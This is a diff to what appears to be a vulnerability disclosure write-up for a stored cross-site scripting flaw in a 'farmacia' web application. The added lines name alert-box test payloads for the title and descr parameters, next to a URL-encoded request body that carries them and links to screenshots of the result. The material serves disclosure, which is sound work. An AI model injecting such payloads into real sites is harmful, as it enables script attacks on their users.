@@ -73,7 +73,8 @@ Connection: keep-alive
 srno=1&newtitle=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&newdescr=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&sub=
 
 ```
-
+For title parameter, the test payload is `<script>alert(1)</script>`  
+For desrc parameter, the test payload is `<script>alert(2)</script>`  
 Visit this URL to trigger the cross-site scripting vulnerability.
 
 ```
@@ -82,4 +83,7 @@ http://farmacia/adicionar-produto.php
 
 **Result**
 
-![image-20241128083927477](https://raw.githubusercontent.com/LamentXU123/cve/refs/heads/main/assest/xss3.png)
+For parameter "title":  
+![image-20241128083927477](https://raw.githubusercontent.com/LamentXU123/cve/refs/heads/main/assest/xss3.png)  
+For parameter "descr":  
+![image-20241128083927477](https://raw.githubusercontent.com/LamentXU123/cve/refs/heads/main/assest/xss3_2.png) 
